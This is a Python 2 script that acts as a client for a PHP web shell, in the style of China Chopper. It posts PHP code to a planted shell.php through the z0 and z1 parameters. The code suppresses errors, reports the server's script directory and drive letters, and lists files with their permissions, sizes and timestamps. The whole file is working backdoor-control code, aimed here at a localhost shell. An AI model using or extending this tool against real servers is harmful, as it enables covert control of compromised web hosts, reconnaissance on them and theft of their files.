#!/usr/bin/env python
#-*- coding:utf-8 -*-
import re
import request

data = re.compile(r'\-\>\|(?P<res>.*)\|\<\-')

def init_filemanager(url):
    z0 = '''@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");$D=dirname($_SERVER["SCRIPT_FILENAME"]);echo $D."\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir($L.":"))echo($L.":");};echo("|<-");die();'''

    pwd = request.post_data(url, z0=z0)
    pwd = data.search(pwd).group("res")

    pwd = pwd.strip()
    if not pwd.endswith('/'):
        pwd += '/'
    return pwd
    

def get_path(url, path):
    z0 = '''@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");$D=base64_decode($_POST["z1"]);$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."|";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo("|<-");die();'''
    z1 = path

    res = request.post_data(url,z0=z0,z1=z1)
    res = data.search(res).group("res")
    #print res
    res = res.split('|')
    res_dirs = []
    res_files = []
    for r in res:
        r = r.split('\t')
        if r[0]:
            if r[0].endswith('/') and r[0] != './' and r[0] != '../':
                res_dirs.append(r)
            else:
                res_files.append(r)

    res_dirs.sort()
    res_files.sort()
    return res_dirs,res_files

if __name__ == '__main__':
    res_dirs, res_files = get_path('http://127.0.0.1/null/shell.php','/var/www/')
    print res_dirs
    print res_files
    print res_dirs + res_files
    # res = res[3:-3]
    # file_list = []
    # for f in res.split('|'):
    #     file_list.append(f.split('\t'))
    #print file_list

    pwd =  init_filemanager('http://127.0.0.1/null/shell.php')
    print pwd
